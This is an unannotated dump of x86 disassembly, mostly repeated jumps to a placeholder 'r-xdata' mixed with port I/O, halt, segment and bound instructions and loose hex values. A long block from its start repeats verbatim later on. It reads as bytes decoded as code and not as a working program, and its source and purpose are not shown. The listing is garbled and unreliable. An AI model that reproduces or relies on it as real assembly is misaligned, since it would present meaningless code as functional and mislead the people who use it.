jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
out 0xfe al
jpo r-xdata
pop esi
jpo r-xdata
push 0x9
adc al 0x14
sbb ah ah
outsb
outsd
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
shr [ edx ] 0x2
adc al 0x14
jpo r-xdata
jpo r-xdata
sbb edx [ esp + edx ]
jpo r-xdata
adc al 0xbb
fcomp [ 0xffffffffa7bc14bd ]
add dl [ ecx - 0x4cebebe5 ]
add ebp 0xebf39402
jmp r-xdata
adc al 0xbc
mov ebx 0x2822b5b4
sub ebp ecx
or ah bh
jpo r-xdata
outsd
retn
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc al 0xb8
jpo r-xdata
and dl [ edi ]
adc al 0x14
jpo r-xdata
mov eax 0xeb6b7c14
jmp r-xdata
jpo r-xdata
jmp [ eax - 0x52 ]
jpo r-xdata
xchg ebx eax
add ch [ eax - 0x3d ]
jpo r-xdata
outsb
jpo r-xdata
leave
in al 0x6f
sub ch cl
add ah [ esi - 0x8 ]
sbb [ edx ] 0xfffffff6
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jl r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
retn
jpo r-xdata
xor edx [ esp + edx ]
jpo r-xdata
test [ edx + 0x2f5d14ab ] 0xeb
jmp r-xdata
adc al 0xbc
out 0x60 eax
xor ebp [ eax + 0x10 ]
adc al 0xe4
jpo r-xdata
bound ebp [ esi - 0x61eb44e9 ]
jpo r-xdata
push 0x6ee4ebd3
mov esi 0xcca10337
jmp r-xdata
adc al 0x14
jpo r-xdata
jmp r-xdata
mov esi 0xebfee602
jmp r-xdata
jpo r-xdata
jpo r-xdata
lea ebp [ eax - 0x2d ]
jmp r-xdata
jmp r-xdata
jpo r-xdata
push 0x7bebebc3
adc al 0xc0
jpo r-xdata
adc al 0x9e
bound esp [ esi + 0x38810287 ]
adc al 0x14
jpo r-xdata
sub al [ edx ]
jpo r-xdata
sub esp [ esi + 0x6e ]
push edi
adc [ esp + edx ] edx
in al 0x6f
mov ecx fs
jmp r-xdata
or al 0x14
jpo r-xdata
clc
jmp r-xdata
hlt
push es
jpo r-xdata
0xebeb
scasb [ edi ]
pop ss
mov ebx 0x60ff9e14
scasb [ edi ]
jecxz r-xdata
jpo r-xdata
and ch [ eax ]
jpo r-xdata
adc [ ebx - 0x140bf9fe ] 0xd27b7beb
jpo r-xdata
mov eax 0x82f61a83
stosd [ edi ]
adc al 0x5d
das
jmp r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
jmp r-xdata
loope r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
or al 0x14
adc al 0x7b
jpo r-xdata
mov esi 0x140b3602
adc al 0x83
out dx eax
0x6f66ebeb 0x7fcf
add bh [ edi + 0x7b141416 ]
jpo r-xdata
outsb
leave
fucomi st3
jmp r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
sti
adc al 0x9e
out 0x14 eax
sahf
add al [ esi ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
cmp [ esp + edx ] edx
jpo r-xdata
scasb [ edi ]
jpo r-xdata
mov ah 0xb5
in al 0x6e
jpo r-xdata
jpo r-xdata
mov [ 0x2141410 ] al
sbb [ ecx ] ebx
adc al 0x14
jmp r-xdata
jpo r-xdata
sub [ ebx - 0x14d0a2ec ] 0xeb
jmp r-xdata
sbb dh dh
jpo r-xdata
sub ebx 0xffffffdb
jmp sub_46ebbc
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
mov esp 0xeb83ef81
jpo r-xdata
jpo r-xdata
mov ebp 0x7b14140b
jpo r-xdata
adc al 0x7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
in al 0x6f
pop ecx
into
jmp r-xdata
sbb al 0x14
adc al 0x7b
jpo r-xdata
add dh [ edi ]
push 0x6fe41413
cmp edx 0xec02ebeb
push ss
jmp r-xdata
jpo r-xdata
rcl [ eax - 0x5d911b29 ] cl
adc [ esp + edx ] dl
add bl [ ecx ]
jpo r-xdata
bound edi [ esi + 0x6702b151 ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
outsb
outsd
stc
jmp r-xdata
mov esp 0x683360e7
adc [ esp ] dl
fucomi st3
jmp r-xdata
bound esi [ esi + 0x37ae6017 ]
jpo r-xdata
mov ah 0x2
int1
0x7b7bebeb 0x817b
out dx eax
jpo r-xdata
jpo r-xdata
outsb
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
or edx [ esp + edx ]
jpo r-xdata
jpo r-xdata
pushad
sub ch cl
mov esp 0x52021160
add al [ esi + 0x39 ]
bound esp [ esi - 0x7edc9fe5 ]
lds ecx [ ebp - 0x4de6599e ]
lea esp [ edx - 0x5a ]
jpo r-xdata
sbb eax [ edx ]
aaa
mov bl 0x81
popfd
lea esp [ edx - 0x52 ]
adc al 0xb2
bound ebp [ esi - 0x1bd72fe9 ]
outsd
sub eax [ edx ]
lodsd [ esi ]
jmp r-xdata
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x42 ]
push ecx
mov cl 0x2
loopne r-xdata
scasb [ edi ]
mov bh 0xbb
add al [ eax + 0x8 ]
adc al 0x14
jpo r-xdata
shr [ ebp - 0x4911b21 ] 0x1
jmp r-xdata
pop ss
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7c
pop ds
jmp r-xdata
mov ebp 0xbb02b9bc
outsd
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov eax 0x14379e14
jl r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
adc al 0x14
sbb esp [ eax + 0x23 ]
add ebp 0x19a6628d
mov dl 0x8d
bound esp [ esi + 0x3946021f ]
jpo r-xdata
sub ebx 0xdc03ebeb
jmp r-xdata
add eax [ ebp + 0x3 ]
adc al 0x14
jpo r-xdata
nop
[ edx - 0x1b185930 ]
jpo r-xdata
mov dl 0x62
scasb [ edi ]
pop ss
shr [ eax ] 0x1
in al 0x6f
inc ebp
add edx [ esp + edx ]
jpo r-xdata
jmp r-xdata
pushad
scasb [ edi ]
aaa
mov dh 0x17
jpo r-xdata
or ebx eax
adc al 0x2
jmp r-xdata
mov ch 0xf1
mov ebx 0x14e3ae60
adc al 0x14
jpo r-xdata
or al 0x14
adc al 0x7b
jpo r-xdata
outsb
jpo r-xdata
jmp r-xdata
jmp r-xdata
adc al 0x9e
aaa
adc al 0x7c
and eax [ ecx - 0x599d723b ]
sbb [ edx + 0x1fa6628d ] esi
outsb
das
pop ss
adc al 0x14
add bh [ eax ]
imul ebp ebx 0xffffffeb
jmp r-xdata
jpo r-xdata
shl [ esi + 0x7d69e4e7 ] 0x1
cli
jmp r-xdata
jpo r-xdata
iretd
push 0x60bce92a
adc [ edx ] eax
push edx
dec edi
adc al 0x14
adc al 0x7c
pop ss
jmp r-xdata
add cl [ eax + 0x3c ]
add bh ah
mov cl 0x81
jpo r-xdata
adc [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
pop ds
jpo r-xdata
add ah dh
outsb
cmp esp esp
outsb
call 0xffffffffe932d4f0
sahf
jpo r-xdata
outsb
pop es
push ss
adc al 0x14
add esp [ eax ]
retn
loop r-xdata
bound edx [ esi - 0x72ea9fcb ]
bound edx [ esi + 0x214d80b ]
outsd
outsb
sub esp esp
jpo r-xdata
add al ch
jpo r-xdata
mov [ ebp + 0x60fdae62 ] cl
jpo r-xdata
adc al 0xbb
pushad
scasb [ edi ]
jecxz r-xdata
jpo r-xdata
in al 0x6f
jpo r-xdata
jpo r-xdata
loopne r-xdata
jpo r-xdata
call [ edx ]
in al 0x6f
jpo r-xdata
bound ebp [ esi - 0xae8fddb ]
jmp r-xdata
jpo r-xdata
adc dl [ esp + edx ]
jpo r-xdata
bound ebp [ esi - 0x72d69f03 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
mov ebx 0xe42b6ecf
jpo r-xdata
adc al 0x14
adc al 0x14
cld
cmp [ eax + 0x2d ] ah
add al [ edi + 0x7b141418 ]
out dx eax
jmp r-xdata
jpo r-xdata
clc
jmp r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
lea esp [ edx - 0x52 ]
daa
mov bl 0x81
test [ ecx + 0x628d9e81 ] dh
out 0xeb al
jmp r-xdata
mov dh 0xe7
in al 0x6f
adc al 0x14
adc al 0x7b
jpo r-xdata
jpo r-xdata
adc eax [ edx ]
jpo r-xdata
sub [ ebp - 0x4c0c519e ] ecx
add [ esi - 0xe519d73 ] 0x14362702
adc al 0x7b
jpo r-xdata
std
pushad
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
lea esp [ edx - 0x6a ]
push edi
pushad
adc eax 0x140b5902
adc al 0x7b
lea esp [ edx - 0x52 ]
sbb eax 0xae628db3
adc ebx eax
sub ecx [ ebp - 0x7cee519e ]
out dx eax
0x6e66ebeb 0x106f
xlat
in al 0x6e
jpo r-xdata
adc al 0x14
mov esp 0x106f6666
adc al 0x14
jpo r-xdata
shl [ esi - 0x52 ] cl
pop es
add bh [ ecx + 0x7bebebfd ]
jpo r-xdata
popfd
jpo r-xdata
adc al 0x9e
or eax [ edx ]
int 0xe
scasb [ edi ]
adc al 0x9e
lar ebp [ esi ]
adc al 0x14
shl [ esi + 0x3e6fe4e7 ] cl
adc al 0x14
jpo r-xdata
jpo r-xdata
lds edx [ edx ]
jpo r-xdata
jpo r-xdata
das
jpo r-xdata
jpo r-xdata
jpo r-xdata
pushad
sub eax 0x14188702
adc al 0x7b
add cl [ ebx ]
jpo r-xdata
adc [ esp ] dl
outsb
xor ebp 0x2bd8ebeb
add al cl
sbb dl [ esp + edx ]
jpo r-xdata
xor al 0x14
adc al 0x81
out dx eax
sub ebx 0xffffffdb
jmp r-xdata
mov al 0x2
retn
adc al 0x14
sub eax [ edx ]
add dl dh
jmp r-xdata
adc al 0x6e
jpo r-xdata
scasb [ edi ]
aas
jpo r-xdata
cmpsb [ esi ] [ edi ]
adc al 0x14
jpo r-xdata
bound ebp [ esi - 0x797e4c0d ]
lea esp [ edx - 0x52 ]
int1
add ah [ edi ]
adc al 0x14
jpo r-xdata
add cl [ ecx ]
out dx al
jmp r-xdata
add dh [ eax + 0x34 ]
jpo r-xdata
and ch [ eax ]
jpo r-xdata
jpo r-xdata
add [ esp + edx ] edx
outsb
jpo r-xdata
add bh [ ebx + 0x7b141400 ]
jpo r-xdata
arpl bx bp
adc al 0x14
stosd [ edi ]
add bl [ ebp + 0xc ]
adc al 0x14
pushad
scasb [ edi ]
pop ss
sahf
xchg esp eax
adc al 0x14
add cl ah
or eax 0x7b7b1414
mov esp 0xe42b6ebf
jmp r-xdata
adc al 0xbc
mov edi 0x6fe42b6e
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
xor al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
outsd
sbb [ esp + edx ] edx
pop es
inc edi
out dx eax
jmp r-xdata
cld
jmp sub_46edc3
jpo r-xdata
add [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
jmp r-xdata
mov esp [ eax + 0x33 ]
outsb
xor ah ah
outsd
dec esi
bound ebx [ esi + 0x3b ]
push ss
adc al 0x14
outsb
sub eax [ edx ]
push 0x9
adc al 0x14
jpo r-xdata
outsd
outsb
sub esp esp
bound ebp [ esi + 0x33ec0213 ]
fwait
pop ss
add ah [ eax + 0x7b14140f ]
adc al 0x14
pushad
sub al [ edx ]
salc
jpo r-xdata
jpo r-xdata
jmp r-xdata
push 0x7ee41413
sub ah [ eax + 0x1a ]
adc al 0x38
jmp r-xdata
jpo r-xdata
add dh [ ebp + 0x7bebebf1 ]
jpo r-xdata
adc al 0x7b
jpo r-xdata
bound ebp [ ebp + 0xcc103ef ]
adc al 0x14
jpo r-xdata
int3
jpo r-xdata
adc al 0x14
jpo r-xdata
push cs
jpo r-xdata
call 0xffffffffaea9ea4c
adc esp [ eax - 0x52 ]
pop ss
shr [ esi + 0x12c50213 ] 0x1
xor edi [ edx - 0x25fd547f ]
xor edx [ esp + edx ]
jpo r-xdata
cmpsb [ esi ] [ edi ]
jmp r-xdata
clc
call 0xffffffffd932da4d
sub ebp [ ebx + 0x7b7b7b28 ]
jpo r-xdata
pushfd
jpo r-xdata
jpo r-xdata
push 0x5ce4e903
jecxz r-xdata
mov [ 0xffffffffefad62bc ] al
add eax ecx
or al 0x14
adc al 0x83
mov ebp [ esp + ecx * 2 - 0x23 ]
mov esp 0xeb5b6d62
jmp r-xdata
out dx eax
jpo r-xdata
adc al 0x14
jpo r-xdata
adc al 0xe8
sub edi [ ebx - 0x140363fe ]
jmp r-xdata
cld
or dh [ edi ]
adc al 0x14
call 0xffffffff9c49a980
jmp r-xdata
mov ah 0xb5
mov al 0x22
sub [ ebx + 0x7b ] bh
jpo r-xdata
add ch ah
jpo r-xdata
aas
adc al 0x14
jpo r-xdata
add dl dh
jmp r-xdata
add bh [ eax - 0x10 ]
jmp sub_46edcb
jpo r-xdata
adc al 0x14
lea esp [ edx - 0x52 ]
xor [ eax + 0x2a ] esp
lea esp [ edx - 0x52 ]
aaa
mov bl 0x81
lds esi [ ecx + eax * 4 - 0x519d7272 ]
xor eax 0xebee8302
jmp r-xdata
call 0xffffffff8d5b011f
bound ebp [ esi - 0x72d59fcf ]
bound ebp [ esi - 0x3a7e4cc9 ]
mov ah 0x81
or [ ebx - 0x4322b394 ] 0x62
insd
pop ebx
jmp r-xdata
mov esp 0x3efad62
ror [ esp + edx ] 0x14
pop esp
lodsd [ esi ]
in eax dx
add dl bl
pop ds
adc al 0x14
jpo r-xdata
mov eax 0x1414c802
adc al 0x7b
add cl [ ebx + 0x19 ]
adc al 0x14
in al 0x6e
mov edx 0x60141417
fwait
in al 0x6e
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
xor edx [ esp + edx ]
jpo r-xdata
jpo r-xdata
and eax 0xebf51702
jmp r-xdata
bound ebp [ esi - 0x7b7e4cd9 ]
mov cl 0x81
sahf
lea esp [ edx - 0x52 ]
xor al 0x14
adc al 0x14
sahf
pop ss
mov esp 0xeb637d14
scasb [ edi ]
cmp ebx [ ecx + 0x3cbcb9d ]
sub dh dh
jmp r-xdata
jpo r-xdata
jpo r-xdata
mov ebx 0x207ae66
adc al 0x7b
adc al 0x9d
jpo r-xdata
jpo r-xdata
xlat
call 0x3e64f209
adc al 0x14
jpo r-xdata
jecxz r-xdata
jpo r-xdata
sti
jpo r-xdata
jpo r-xdata
sub [ ebx + 0x7b ] bh
jpo r-xdata
jpo r-xdata
jpo r-xdata
jo r-xdata
jpo r-xdata
clc
jmp r-xdata
add edi eax
jpo r-xdata
outsb
out 0x3 eax
adc al 0x9e
sub_46e45d
pushad
jmp r-xdata
add cl [ ecx - 0xc ]
jmp r-xdata
jmp r-xdata
jmp r-xdata
sbb esi ebp
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
pop ebp
in al dx
mov ebx 0xeb212c6a
jmp r-xdata
jpo r-xdata
jpo r-xdata
0x9f56ee4 0x1414
in al 0x6e
out dx al
jmp r-xdata
jpo r-xdata
mov esp 0xe3cf9f14
pushad
adc edx [ esp + edi * 4 ]
pop [ edx ]
outsb
sub esp esp
outsd
out dx eax
jmp r-xdata
adc al 0x14
mov dl 0x6e
scasb [ edi ]
adc edi [ ebx + 0x1481f581 ]
add bh [ ebx ]
adc dl [ esp + edx ]
jpo r-xdata
fsetpm287_nop
outsd
jpo r-xdata
mov esi 0x7680760
sti
or [ edx - 0x1411c9fe ] 0x7b7b7beb
add esi [ ebx - 0x3e ]
jmp r-xdata
adc al 0x68
bound esp [ esi + 0x36260207 ]
adc al 0x14
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
pop es
add ah [ esi ]
adc al 0x14
adc al 0x7c
add ebp ebx
jmp r-xdata
mov esi 0x2ebebc1
jmp r-xdata
jmp r-xdata
add [ edx + 0x628d8281 ] esi
cmpsb [ esi ] [ edi ]
add eax 0x14337502
adc al 0x7b
jpo r-xdata
cmp esp [ edx - 0x4a ]
pop ss
jpo r-xdata
add dl al
hlt
mov dh 0x17
jpo r-xdata
jpo r-xdata
jmp r-xdata
add [ esi + 0x37ae628d ] 0x29b81b3
jne r-xdata
in al 0xeb
jmp r-xdata
in al 0x6f
bound esi [ esi - 0x72cf273d ]
bound esi [ esi - 0x35b2fd3f ]
jmp r-xdata
adc al 0x14
jpo r-xdata
lea esp [ edx - 0x4a ]
int 0x60
xor ecx [ ebp - 0x273c499e ]
xor [ ebp + 0x2c1b662 ] cl
dec ebp
0xebeb
adc al 0x9e
out 0x14 eax
jpo r-xdata
jpo r-xdata
iretd
jmp r-xdata
adc al 0xb2
add cl [ esi ]
jmp r-xdata
cmp al 0x1b
jpo r-xdata
adc al 0x14
mov dl 0x2
or al 0xe6
sbb [ ebx + 0x141c7502 ] 0x7b7b7b14
add edi [ ebx + ebx ]
jpo r-xdata
fsubr [ ebx ]
mov ch 0xb0
and ch [ eax ]
xor esp 0xffffffeb
in al 0xeb
jpo r-xdata
mov dl 0x6e
sub esp esp
outsb
out 0x3 al
adc al 0x14
scasb [ edi ]
cmp edi [ ebx + 0x3e3ae60 ]
ja r-xdata
fsubr [ ebx ]
stosd [ edi ]
and ch [ eax ]
jpo r-xdata
outsb
jmp r-xdata
cmp [ esi ] 0xffffffa4
sub [ ebx + 0x7b ] bh
jpo r-xdata
xor ebp ebx
jpo r-xdata
outsb
sub esp esp
outsb
out 0xeb al
jmp r-xdata
into
add edi [ esi + 0x2ebebc1 ]
in al 0x6f
add eax edx
jmp r-xdata
jmp r-xdata
mov esp 0xcc9803bb
jmp r-xdata
scasw [ edi ]
iretd
lahf
iretd
jpo r-xdata
mov dh 0xe7
in al 0x6f
xor al 0xc2
jmp r-xdata
sub eax [ edx ]
into
xor [ esp + edx ] dl
jpo r-xdata
mov ch 0x6e
jmp r-xdata
or [ esi + 0xbbe628d ] 0xbe628db1
or eax ebx
cmp [ ecx + 0x36110285 ] eax
or [ esp + edx ] edx
jpo r-xdata
pop esp
jpo r-xdata
adc al 0xb8
jpo r-xdata
jmp r-xdata
pop eax
fld [ eax + 0x2a ]
jmp 0xffffffffec3f4f56
in al 0x5c
jpo r-xdata
add al [ ebp + 0xa ]
adc al 0x14
jpo r-xdata
jpo r-xdata
mov eax 0x140a4502
adc al 0x7b
jpo r-xdata
in al 0x6e
add bl [ eax - 0x10 ]
adc al 0x14
jpo r-xdata
mov ebx 0xbcebebe9
sbb [ eax + 0x608a81b2 ] 0xae628d2a
xor esi [ ebx + 0x3b608681 ]
lea esp [ edx - 0x42 ]
xor [ ecx + 0x628d9b81 ] esi
mov esi 0x8781b137
lea esp [ edx - 0x42 ]
xor eax 0x8d8e81b1
bound edi [ esi + 0x628db10b ]
mov esi 0x8139d809
test [ edx ] eax
adc [ esi ] esi
add bl [ ebp + edi + 0x14 ]
adc al 0x7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
out 0xfe al
jpo r-xdata
pop esi
jpo r-xdata
push 0x9
adc al 0x14
sbb ah ah
outsb
outsd
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
shr [ edx ] 0x2
adc al 0x14
jpo r-xdata
jpo r-xdata
sbb edx [ esp + edx ]
jpo r-xdata
adc al 0xbb
fcomp [ 0xffffffffa7bc14bd ]
add dl [ ecx - 0x4cebebe5 ]
add ebp 0xebf39402
jmp r-xdata
adc al 0xbc
mov ebx 0x2822b5b4
sub ebp ecx
or ah bh
jpo r-xdata
outsd
retn
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc al 0xb8
jpo r-xdata
and dl [ edi ]
adc al 0x14
jpo r-xdata
mov eax 0xeb6b7c14
jmp r-xdata
jpo r-xdata
jmp [ eax - 0x52 ]
jpo r-xdata
xchg ebx eax
add ch [ eax - 0x3d ]
jpo r-xdata
outsb
jpo r-xdata
leave
in al 0x6f
sub ch cl
add ah [ esi - 0x8 ]
sbb [ edx ] 0xfffffff6
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jl r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
retn
jpo r-xdata
xor edx [ esp + edx ]
jpo r-xdata
test [ edx + 0x2f5d14ab ] 0xeb
jmp r-xdata
adc al 0xbc
out 0x60 eax
xor ebp [ eax + 0x10 ]
adc al 0xe4
jpo r-xdata
bound ebp [ esi - 0x61eb44e9 ]
jpo r-xdata
push 0x6ee4ebd3
mov esi 0xcca10337
jmp r-xdata
adc al 0x14
jpo r-xdata
jmp r-xdata
mov esi 0xebfee602
jmp r-xdata
jpo r-xdata
jpo r-xdata
lea ebp [ eax - 0x2d ]
jmp r-xdata
jmp r-xdata
jpo r-xdata
push 0x7bebebc3
adc al 0xc0
jpo r-xdata
adc al 0x9e
bound esp [ esi + 0x38810287 ]
adc al 0x14
jpo r-xdata
sub al [ edx ]
jpo r-xdata
sub esp [ esi + 0x6e ]
push edi
adc [ esp + edx ] edx
in al 0x6f
mov ecx fs
jmp r-xdata
or al 0x14
jpo r-xdata
clc
jmp r-xdata
hlt
push es
jpo r-xdata
0xebeb
scasb [ edi ]
pop ss
mov ebx 0x60ff9e14
scasb [ edi ]
jecxz r-xdata
jpo r-xdata
and ch [ eax ]
jpo r-xdata
adc [ ebx - 0x140bf9fe ] 0xd27b7beb
jpo r-xdata
mov eax 0x82f61a83
stosd [ edi ]
adc al 0x5d
das
jmp r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
jmp r-xdata
loope r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
or al 0x14
adc al 0x7b
jpo r-xdata
mov esi 0x140b3602
adc al 0x83
out dx eax
0x6f66ebeb 0x7fcf
add bh [ edi + 0x7b141416 ]
jpo r-xdata
outsb
leave
fucomi st3
jmp r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
sti
adc al 0x9e
out 0x14 eax
sahf
add al [ esi ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
cmp [ esp + edx ] edx
jpo r-xdata
scasb [ edi ]
jpo r-xdata
mov ah 0xb5
in al 0x6e
jpo r-xdata
jpo r-xdata
mov [ 0x2141410 ] al
sbb [ ecx ] ebx
adc al 0x14
jmp r-xdata
jpo r-xdata
sub [ ebx - 0x14d0a2ec ] 0xeb
jmp r-xdata
sbb dh dh
jpo r-xdata
sub ebx 0xffffffdb
jmp sub_46ebbc
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
mov esp 0xeb83ef81
jpo r-xdata
jpo r-xdata
mov ebp 0x7b14140b
jpo r-xdata
adc al 0x7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
in al 0x6f
pop ecx
into
jmp r-xdata
sbb al 0x14
adc al 0x7b
jpo r-xdata
add dh [ edi ]
push 0x6fe41413
cmp edx 0xec02ebeb
push ss
jmp r-xdata
jpo r-xdata
rcl [ eax - 0x5d911b29 ] cl
adc [ esp + edx ] dl
add bl [ ecx ]
jpo r-xdata
bound edi [ esi + 0x6702b151 ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
outsb
outsd
stc
jmp r-xdata
mov esp 0x683360e7
adc [ esp ] dl
fucomi st3
jmp r-xdata
bound esi [ esi + 0x37ae6017 ]
jpo r-xdata
mov ah 0x2
int1
0x7b7bebeb 0x817b
out dx eax
jpo r-xdata
jpo r-xdata
outsb
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
or edx [ esp + edx ]
jpo r-xdata
jpo r-xdata
pushad
sub ch cl
mov esp 0x52021160
add al [ esi + 0x39 ]
bound esp [ esi - 0x7edc9fe5 ]
lds ecx [ ebp - 0x4de6599e ]
lea esp [ edx - 0x5a ]
jpo r-xdata
sbb eax [ edx ]
aaa
mov bl 0x81
popfd
lea esp [ edx - 0x52 ]
adc al 0xb2
bound ebp [ esi - 0x1bd72fe9 ]
outsd
sub eax [ edx ]
lodsd [ esi ]
jmp r-xdata
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x42 ]
push ecx
mov cl 0x2
loopne r-xdata
scasb [ edi ]
mov bh 0xbb
add al [ eax + 0x8 ]
adc al 0x14
jpo r-xdata
shr [ ebp - 0x4911b21 ] 0x1
jmp r-xdata
pop ss
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7c
pop ds
jmp r-xdata
mov ebp 0xbb02b9bc
outsd
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov eax 0x14379e14
jl r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
adc al 0x14
sbb esp [ eax + 0x23 ]
add ebp 0x19a6628d
mov dl 0x8d
bound esp [ esi + 0x3946021f ]
jpo r-xdata
sub ebx 0xdc03ebeb
jmp r-xdata
add eax [ ebp + 0x3 ]
adc al 0x14
jpo r-xdata
nop
[ edx - 0x1b185930 ]
jpo r-xdata
mov dl 0x62
scasb [ edi ]
pop ss
shr [ eax ] 0x1
in al 0x6f
inc ebp
add edx [ esp + edx ]
jpo r-xdata
jmp r-xdata
pushad
scasb [ edi ]
aaa
mov dh 0x17
jpo r-xdata
or ebx eax
adc al 0x2
jmp r-xdata
mov ch 0xf1
mov ebx 0x14e3ae60
adc al 0x14
jpo r-xdata
or al 0x14
adc al 0x7b
jpo r-xdata
outsb
jpo r-xdata
jmp r-xdata
jmp r-xdata
adc al 0x9e
aaa
adc al 0x7c
and eax [ ecx - 0x599d723b ]
sbb [ edx + 0x1fa6628d ] esi
outsb
das
pop ss
adc al 0x14
add bh [ eax ]
imul ebp ebx 0xffffffeb
jmp r-xdata
jpo r-xdata
shl [ esi + 0x7d69e4e7 ] 0x1
cli
jmp r-xdata
jpo r-xdata
iretd
push 0x60bce92a
adc [ edx ] eax
push edx
dec edi
adc al 0x14
adc al 0x7c
pop ss
jmp r-xdata
add cl [ eax + 0x3c ]
add bh ah
mov cl 0x81
jpo r-xdata
adc [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
pop ds
jpo r-xdata
add ah dh
outsb
cmp esp esp
outsb
call 0xffffffffe932d4f0
sahf
jpo r-xdata
outsb
pop es
push ss
adc al 0x14
add esp [ eax ]
retn
loop r-xdata
bound edx [ esi - 0x72ea9fcb ]
bound edx [ esi + 0x214d80b ]
outsd
outsb
sub esp esp
jpo r-xdata
add al ch
jpo r-xdata
mov [ ebp + 0x60fdae62 ] cl
jpo r-xdata
adc al 0xbb
pushad
scasb [ edi ]
jecxz r-xdata
jpo r-xdata
in al 0x6f
jpo r-xdata
jpo r-xdata
loopne r-xdata
jpo r-xdata
call [ edx ]
in al 0x6f
jpo r-xdata
bound ebp [ esi - 0xae8fddb ]
jmp r-xdata
jpo r-xdata
adc dl [ esp + edx ]
jpo r-xdata
bound ebp [ esi - 0x72d69f03 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
mov ebx 0xe42b6ecf
jpo r-xdata
adc al 0x14
adc al 0x14
cld
cmp [ eax + 0x2d ] ah
add al [ edi + 0x7b141418 ]
out dx eax
jmp r-xdata
jpo r-xdata
clc
jmp r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
lea esp [ edx - 0x52 ]
daa
mov bl 0x81
test [ ecx + 0x628d9e81 ] dh
out 0xeb al
jmp r-xdata
mov dh 0xe7
in al 0x6f
adc al 0x14
adc al 0x7b
jpo r-xdata
jpo r-xdata
adc eax [ edx ]
jpo r-xdata
sub [ ebp - 0x4c0c519e ] ecx
add [ esi - 0xe519d73 ] 0x14362702
adc al 0x7b
jpo r-xdata
std
pushad
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
lea esp [ edx - 0x6a ]
push edi
pushad
adc eax 0x140b5902
adc al 0x7b
lea esp [ edx - 0x52 ]
sbb eax 0xae628db3
adc ebx eax
sub ecx [ ebp - 0x7cee519e ]
out dx eax
0x6e66ebeb 0x106f
xlat
in al 0x6e
jpo r-xdata
adc al 0x14
mov esp 0x106f6666
adc al 0x14
jpo r-xdata
shl [ esi - 0x52 ] cl
pop es
add bh [ ecx + 0x7bebebfd ]
jpo r-xdata
popfd
jpo r-xdata
adc al 0x9e
or eax [ edx ]
int 0xe
scasb [ edi ]
adc al 0x9e
lar ebp [ esi ]
adc al 0x14
shl [ esi + 0x3e6fe4e7 ] cl
adc al 0x14
jpo r-xdata
jpo r-xdata
lds edx [ edx ]
jpo r-xdata
jpo r-xdata
das
jpo r-xdata
jpo r-xdata
jpo r-xdata
pushad
sub eax 0x14188702
adc al 0x7b
add cl [ ebx ]
jpo r-xdata
adc [ esp ] dl
outsb
xor ebp 0x2bd8ebeb
add al cl
sbb dl [ esp + edx ]
jpo r-xdata
xor al 0x14
adc al 0x81
out dx eax
sub ebx 0xffffffdb
jmp r-xdata
mov al 0x2
retn
adc al 0x14
sub eax [ edx ]
add dl dh
jmp r-xdata
adc al 0x6e
jpo r-xdata
scasb [ edi ]
aas
jpo r-xdata
cmpsb [ esi ] [ edi ]
adc al 0x14
jpo r-xdata
bound ebp [ esi - 0x797e4c0d ]
lea esp [ edx - 0x52 ]
int1
add ah [ edi ]
adc al 0x14
jpo r-xdata
add cl [ ecx ]
out dx al
jmp r-xdata
